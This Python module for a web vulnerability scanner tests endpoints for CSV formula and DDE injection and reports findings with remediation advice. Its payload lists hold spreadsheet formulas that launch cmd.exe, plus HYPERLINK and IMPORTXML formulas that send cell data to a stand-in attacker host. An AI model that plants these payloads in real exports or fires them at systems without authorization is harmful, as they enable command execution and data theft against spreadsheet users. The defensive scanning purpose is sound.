"""
CSV Injection Tester — Detects CSV/spreadsheet injection vulnerabilities.

Covers:
  - Formula injection (=CMD, =HYPERLINK, =IMPORTXML)
  - DDE payload injection (Dynamic Data Exchange)
  - Detection of CSV export endpoints that don't sanitize
"""
import logging
import re
import urllib.parse

from apps.scanning.engine.testers.base_tester import BaseTester

logger = logging.getLogger(__name__)

# ── CSV export endpoint indicators ───────────────────────────────────────────
CSV_EXPORT_PATTERNS = [
    r'/export', r'/download', r'/csv', r'/xlsx',
    r'/report', r'format=csv', r'format=xlsx', r'format=xls',
    r'export=true', r'download=csv', r'type=csv', r'\.csv$',
    r'\.xlsx$', r'\.xls$', r'content-disposition.*\.csv',
]

# ── Formula injection payloads ───────────────────────────────────────────────
FORMULA_PAYLOADS = [
    '=cmd|"/C calc"!A0',
    '=HYPERLINK("https://evil.example.com/steal?cookie="&A1,"Click")',
    '=IMPORTXML("https://evil.example.com/"&A1,"//a")',
    '+cmd|"/C calc"!A0',
    '-cmd|"/C calc"!A0',
    '@SUM(1+1)*cmd|"/C calc"!A0',
    '=1+1',  # Simple formula — if reflected, formulas work
]

# ── DDE payloads ─────────────────────────────────────────────────────────────
DDE_PAYLOADS = [
    '=DDE("cmd","/C calc","!A0")',
    '=MSEXCEL|"\\..\\..\\..\\Windows\\System32\\cmd.exe"!/c calc',
]

# ── Dangerous formula prefixes ───────────────────────────────────────────────
FORMULA_PREFIX_RE = re.compile(r'^[=+\-@]\s*(?:cmd|DDE|HYPERLINK|IMPORTXML|MSEXCEL)', re.IGNORECASE)

# ── Content-type indicators for CSV ──────────────────────────────────────────
CSV_CONTENT_TYPES = [
    'text/csv', 'application/csv', 'application/vnd.ms-excel',
    'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
]


class CSVInjectionTester(BaseTester):
    """Test for CSV/spreadsheet injection vulnerabilities."""

    TESTER_NAME = 'CSV Injection'

    def test(self, page, depth: str = 'medium', recon_data: dict = None) -> list:
        vulns = []
        url = getattr(page, 'url', '')
        body = getattr(page, 'body', '') or ''
        params = getattr(page, 'parameters', {}) or {}
        forms = getattr(page, 'forms', []) or []
        headers = getattr(page, 'headers', {}) or {}

        is_csv_endpoint = self._is_csv_endpoint(url, headers)

        # 1. Check if page already has formula content (info leak)
        vuln = self._check_formula_in_body(url, body)
        if vuln:
            vulns.append(vuln)

        if depth == 'shallow' and not is_csv_endpoint:
            return vulns

        # 2. Test parameters on CSV export endpoints
        if is_csv_endpoint:
            vuln = self._test_csv_export_injection(url, params)
            if vuln:
                vulns.append(vuln)

        # 3. Test form inputs that might feed into CSV exports
        if depth in ('medium', 'deep'):
            for form in forms[:3]:
                vuln = self._test_form_csv_injection(url, form)
                if vuln:
                    vulns.append(vuln)
                    break

        # 4. Test for DDE injection (deep only)
        if depth == 'deep' and is_csv_endpoint:
            vuln = self._test_dde_injection(url, params)
            if vuln:
                vulns.append(vuln)

        return vulns

    # ── Detection helpers ────────────────────────────────────────────────────

    def _is_csv_endpoint(self, url: str, headers: dict) -> bool:
        """Check if the URL or response indicates a CSV export endpoint."""
        for pattern in CSV_EXPORT_PATTERNS:
            if re.search(pattern, url, re.IGNORECASE):
                return True
        content_type = headers.get('Content-Type', '')
        for ct in CSV_CONTENT_TYPES:
            if ct in content_type.lower():
                return True
        return False

    # ── Vulnerability checks ─────────────────────────────────────────────────

    def _check_formula_in_body(self, url: str, body: str):
        """Check for formula prefixes in the page body (existing vulnerability)."""
        lines = body.split('\n')
        for line in lines[:200]:
            stripped = line.strip()
            if FORMULA_PREFIX_RE.match(stripped):
                return self._build_vuln(
                    name='Formula Content in Response',
                    severity='medium',
                    category='Injection',
                    description=(
                        'The page body contains spreadsheet formula prefixes '
                        'that could be exploited if exported to CSV/Excel.'
                    ),
                    impact='Command execution when CSV is opened, data exfiltration via HYPERLINK',
                    remediation=(
                        'Prefix cell values starting with =, +, -, @ with a '
                        "single quote (') or tab character to prevent formula execution."
                    ),
                    cwe='CWE-1236',
                    cvss=6.1,
                    affected_url=url,
                    evidence=f'Formula prefix found: {stripped[:80]}',
                )
        return None

    def _test_csv_export_injection(self, url: str, params: dict):
        """Test CSV export endpoints for formula injection."""
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        all_params = {**params, **{k: v[0] for k, v in qs.items()}}

        for param_name in list(all_params.keys())[:5]:
            payload = FORMULA_PAYLOADS[0]  # =cmd|"/C calc"!A0
            try:
                test_qs = dict(qs)
                test_qs[param_name] = [payload]
                test_query = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
                resp = self._make_request('GET', test_url)
                if resp and resp.status_code == 200:
                    resp_body = getattr(resp, 'text', '')
                    if payload in resp_body or '=cmd' in resp_body:
                        return self._build_vuln(
                            name='CSV Formula Injection',
                            severity='high',
                            category='Injection',
                            description=(
                                f'CSV export reflects formula payload via parameter '
                                f'"{param_name}" without sanitization.'
                            ),
                            impact='Remote command execution when CSV is opened in Excel/LibreOffice',
                            remediation=(
                                "Prefix dangerous cell values with a single quote ('). "
                                'Sanitize =, +, -, @ at the start of cell values.'
                            ),
                            cwe='CWE-1236',
                            cvss=8.6,
                            affected_url=test_url,
                            evidence=f'Formula payload reflected: {payload}',
                        )
            except Exception:
                continue
        return None

    def _test_form_csv_injection(self, url: str, form):
        """Test form inputs for CSV injection in exported data."""
        action = getattr(form, 'action', '') or url
        method = getattr(form, 'method', 'POST').upper()
        inputs = getattr(form, 'inputs', []) or []

        for inp in inputs:
            inp_name = getattr(inp, 'name', '')
            if not inp_name:
                continue
            payload = '=HYPERLINK("https://evil.example.com/","Click")'
            data = {inp_name: payload}
            try:
                resp = self._make_request(method, action, data=data)
                if resp and resp.status_code == 200:
                    resp_body = getattr(resp, 'text', '')
                    if '=HYPERLINK' in resp_body:
                        return self._build_vuln(
                            name='CSV Formula Injection via Form',
                            severity='high',
                            category='Injection',
                            description=(
                                f'Form field "{inp_name}" allows formula injection '
                                'that may appear in CSV exports.'
                            ),
                            impact='Formula execution in spreadsheets, data exfiltration',
                            remediation="Prefix formula characters with ' on CSV output.",
                            cwe='CWE-1236',
                            cvss=7.3,
                            affected_url=action,
                            evidence=f'HYPERLINK formula reflected from: {inp_name}',
                        )
            except Exception:
                continue
        return None

    def _test_dde_injection(self, url: str, params: dict):
        """Test for DDE (Dynamic Data Exchange) injection."""
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        all_params = {**params, **{k: v[0] for k, v in qs.items()}}

        for param_name in list(all_params.keys())[:3]:
            for payload in DDE_PAYLOADS:
                try:
                    test_qs = dict(qs)
                    test_qs[param_name] = [payload]
                    test_query = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = urllib.parse.urlunparse(
                        parsed._replace(query=test_query)
                    )
                    resp = self._make_request('GET', test_url)
                    if resp and resp.status_code == 200:
                        resp_body = getattr(resp, 'text', '')
                        if 'DDE' in resp_body or 'MSEXCEL' in resp_body:
                            return self._build_vuln(
                                name='DDE Injection',
                                severity='high',
                                category='Injection',
                                description=(
                                    'Dynamic Data Exchange (DDE) payload is reflected '
                                    'in export output, enabling remote command execution '
                                    'via Excel/LibreOffice.'
                                ),
                                impact='Remote code execution when spreadsheet is opened',
                                remediation='Strip DDE formulas from export data. Sanitize cell prefixes.',
                                cwe='CWE-1236',
                                cvss=8.6,
                                affected_url=test_url,
                                evidence=f'DDE payload reflected: {payload[:60]}',
                            )
                except Exception:
                    continue
        return None
